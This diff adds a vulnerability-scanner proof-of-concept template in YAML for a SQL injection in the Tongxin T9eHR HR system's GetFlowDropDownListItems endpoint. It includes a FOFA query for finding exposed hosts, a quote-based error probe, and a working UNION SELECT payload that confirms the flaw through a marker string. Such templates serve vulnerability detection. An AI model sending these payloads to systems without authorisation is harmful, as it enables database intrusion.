@@ -1,0 +1,25 @@
+id: poc-yaml-tongxine-t9ehr-getdropdownlistitems-sqli
+info:
+  name: 同鑫T9eHR信息化管理系统 GetDropDownListItems SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: 同鑫T9eHR信息化管理系统
+  fofa: body="T9eHR"
+requests:
+- method: POST
+  path: /Common/GetFlowDropDownListItems
+  headers:
+    Content-Type: application/x-www-form-urlencoded; charset=utf-8
+  data: FixedFormCode=1%27
+  expression: "status_code == 200 && \ncontains(body,\"有语法错误\") &&\ncontains(body,\"\
+    引号不完整\") &&\ncontains(body,\"\\\"success\\\":false\")\n"
+- method: POST
+  path: /Common/GetFlowDropDownListItems
+  headers:
+    Content-Type: application/x-www-form-urlencoded; charset=utf-8
+  data: FixedFormCode=1%27+UNION+ALL+SELECT+NULL%2CCHAR%28113%29%2BCHAR%28106%29%2BCHAR%28113%29%2BCHAR%28118%29%2BCHAR%28113%29%2BCHAR%28109%29%2BCHAR%28107%29%2BCHAR%2886%29%2BCHAR%2897%29%2BCHAR%2897%29%2BCHAR%28115%29%2BCHAR%28107%29%2BCHAR%2879%29%2BCHAR%28111%29%2BCHAR%2898%29%2BCHAR%2871%29%2BCHAR%2871%29--+AHRN
+  expression: "status_code == 200 && \ncontains(body,\"qjqvqmkVaaskOobGG\") &&\ncontains(body,\"\
+    option\") &&\n!contains(body,\"<html\")\n"
+variables: {}
+transport: http
